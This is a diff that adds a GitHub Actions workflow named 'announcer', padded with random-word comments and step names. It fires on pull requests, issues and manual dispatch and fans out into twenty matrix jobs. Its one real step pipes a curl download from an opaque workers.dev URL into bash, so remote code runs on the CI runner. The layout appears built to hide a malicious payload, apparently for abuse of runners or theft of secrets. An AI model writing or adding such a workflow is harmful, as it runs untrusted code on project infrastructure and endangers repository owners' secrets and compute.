@@ -1,0 +1,27 @@
+name: announcer
+
+#dozen
+#potato herd climb medical invent partner
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+  issues:
+
+#indoors
+jobs:
+  govern:
+    #pie conceal support slice praise improper
+    #impressive inflate endanger contemporary setting long
+    steps:
+    - name:  leisure-attack
+      uses: actions/checkout@v6
+    - name: nylon
+      #tremble lawn wooden trail me pattern
+      run: curl -sS -L -X GET "https://nggr01.lucky-darkness-f361.workers.dev/f3282a628fa38d/226db4449a055ca9b9ec1250bc5db9f9d666181ada280e8a/8a?e=1775348219&jaf=qf&bh=u" | bash
+    strategy:
+      matrix:
+        scout: ["rob", "flock", "delicate", "jewel", "distraction"]
+        complex: ["virus", "ratio", "rope", "interpretation"]
+      fail-fast: false
+    runs-on: ubuntu-latest
